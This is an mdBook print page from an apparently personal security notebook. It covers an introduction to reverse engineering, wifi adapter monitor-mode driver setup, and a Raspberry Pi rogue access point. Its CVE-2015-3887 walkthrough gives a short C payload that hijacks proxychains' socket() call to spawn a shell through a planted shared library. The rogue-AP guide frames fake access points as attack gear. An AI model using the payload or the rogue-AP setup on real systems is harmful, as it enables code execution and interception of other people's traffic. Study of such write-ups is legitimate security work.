@@ -1,0 +1,367 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Exploitation Freaks</title>
+        <meta name="robots" content="noindex" />
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.1.</strong> CVE-2015-3887</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">3.1.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href=""./credchecker.html"><strong aria-hidden="true">3.1.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">4.1.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">4.2.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">4.3.</strong> RTL88x2bu Fake Access Point</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Exploitation Freaks</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="binary-exploitation-and-reverse-engineering"><a class="header" href="#binary-exploitation-and-reverse-engineering">Binary Exploitation and Reverse Engineering</a></h1>
+<p><strong>First things first, welcome in my gitbook !</strong></p>
+<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
+<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
+<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
+<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
+<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
+<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
+<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
+<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
+<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
+<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
+<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
+<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
+<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
+<ul>
+<li>
+<p>Disassembly</p>
+<ul>
+<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
+</ul>
+</li>
+<li>
+<p>Decompiling</p>
+<ul>
+<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
+</ul>
+</li>
+</ul>
+<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
+<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
+<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
+<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
+<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
+<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
+<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
+<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
+<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
+<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
+<ol>
+<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
+</ol>
+<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
+$ cd proxychains-ng
+$ vim configure (or nano if you prefer)
+
+# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.
+
+$ vim Makefile
+$ :%/$(exec_prefix)/.
+$ :%/$(prefix)/.        
+
+# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.
+
+$ ./configure
+$ make &amp;&amp; make install
+
+# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
+</code></pre>
+<ol start="2">
+<li>Write and Compile the exploit</li>
+</ol>
+<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
+<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
+<p>Let's write the exploit :)</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int socket(){
+    system(&quot;/bin/bash&quot;);
+    return 0;
+}
+
+</code></pre>
+<p>Let's compile the exploit as a shared object</p>
+<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
+<ol start="3">
+<li>Bypass the default libproxychains4.so using our exploit</li>
+</ol>
+<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">credchecker</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-tn-wn722n"><a class="header" href="#monitor-mode-on-tn-wn722n">Monitor Mode on TN-WN722N</a></h1>
+<p>Installing the required packages and configure them to make TN-WN722N works in monitor mode is pretty straight forward, let's see how to do it.</p>
+<h2 id="arch-linux"><a class="header" href="#arch-linux">Arch Linux</a></h2>
+<pre><code class="language-bash">	pamcan -Syu
+	pacman -S install bc -y
+	sudo rmmod r8188eu.ko
+	git clone https://github.com/aircrack-ng/rtl8188eus
+	cd rtl8188eus
+	sudo -i
+	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
+	exit
+	make
+	sudo make install
+	sudo modprobe 8188eu
+
+	# You can ignore compilation errors related to redhat
+</code></pre>
+<h2 id="debian-based-system"><a class="header" href="#debian-based-system">Debian based System</a></h2>
+<pre><code class="language-bash">	sudo apt update
+	sudo apt install bc -y
+	sudo rmmod r8188eu.ko
+	git clone https://github.com/aircrack-ng/rtl8188eus
+	cd rtl8188eus
+	sudo -i
+	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
+	exit
+	make
+	sudo make install
+	sudo modprobe 8188eu
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-awus036ach"><a class="header" href="#monitor-mode-on-awus036ach">Monitor Mode on AWUS036ACH</a></h1>
+<p>Installing the required packages and configure them to make AWUS036ACH works in monitor mode is pretty straight forward, let's see how to do it.</p>
+<h2 id="arch-linux-1"><a class="header" href="#arch-linux-1">Arch Linux</a></h2>
+<pre><code class="language-bash">	pamcan -Syu
+	pacman -S install bc -y
+	 git clone https://github.com/aircrack-ng/rtl8812au.git
+	cd rtl8812au
+	make
+	sudo make install
+	reboot
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rpi-evil-ap-with-rtl88x2bu-wifi-card-driver"><a class="header" href="#rpi-evil-ap-with-rtl88x2bu-wifi-card-driver">RPI Evil AP with RTL88x2bu Wifi Card Driver</a></h1>
+<p><em><strong>Fake / Evil AP's are great right !</strong></em></p>
+<p>But sometime you want to make sure you have the most cheap pieces of equipment available so that if someone bust your device, you won't get mad losing it.</p>
+<p>Hence this guide... RTL88x2bu is one of the cheapest wireless adapters available where i live, so i bought one a couple of years ago, but it was with disgust that i learn that this adapter didn't support monitor mode (this means i can't use it for attacks like deauth / dumping).</p>
+<p>Although the device can be used to make fake AP's, so this is what this guide will be about.</p>
+<pre><code class="language-bash"># Update all packages per normal
+sudo apt update
+sudo apt upgrade
+
+# Install prereqs
+sudo apt install git dnsmasq hostapd bc build-essential dkms raspberrypi-kernel-headers
+
+# Reboot just in case there were any kernel updates
+sudo reboot
+
+# Pull down the driver source
+git clone https://github.com/cilynx/rtl88x2bu
+cd rtl88x2bu/
+
+# Configure for RasPi
+sed -i 's/I386_PC = y/I386_PC = n/' Makefile
+sed -i 's/ARM_RPI = n/ARM_RPI = y/' Makefile
+
+# DKMS as above
+VER=$(sed -n 's/\PACKAGE_VERSION=&quot;\(.*\)&quot;/\1/p' dkms.conf)
+sudo rsync -rvhP ./ /usr/src/rtl88x2bu-${VER}
+sudo dkms add -m rtl88x2bu -v ${VER}
+sudo dkms build -m rtl88x2bu -v ${VER} # Takes ~3-minutes on a 3B+
+sudo dkms install -m rtl88x2bu -v ${VER}
+
+# Plug in your adapter then confirm your new interface name
+ip addr
+
+# Set a static IP for the new interface (adjust if you have a different interface name or preferred IP)
+sudo tee -a /etc/dhcpcd.conf &lt;&lt;EOF
+interface wlan1
+    static ip_address=192.168.4.1/24
+    nohook wpa_supplicant
+EOF
+
+# Clobber the default dnsmasq config
+sudo tee /etc/dnsmasq.conf &lt;&lt;EOF
+interface=wlan1
+  dhcp-range=192.168.4.100,192.168.4.199,255.255.255.0,24h
+EOF
+
+# Configure hostapd
+sudo tee /etc/hostapd/hostapd.conf &lt;&lt;EOF
+interface=wlan1
+driver=nl80211
+ssid=pinet
+hw_mode=g
+channel=7
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=CorrectHorseBatteryStaple
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+EOF
+
+sudo sed -i 's|#DAEMON_CONF=&quot;&quot;|DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;|' /etc/default/hostapd
+
+# Enable hostapd
+sudo systemctl unmask hostapd
+sudo systemctl enable hostapd
+
+# Reboot to pick up the config changes
+sudo reboot
+
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+    </body>
+</html>
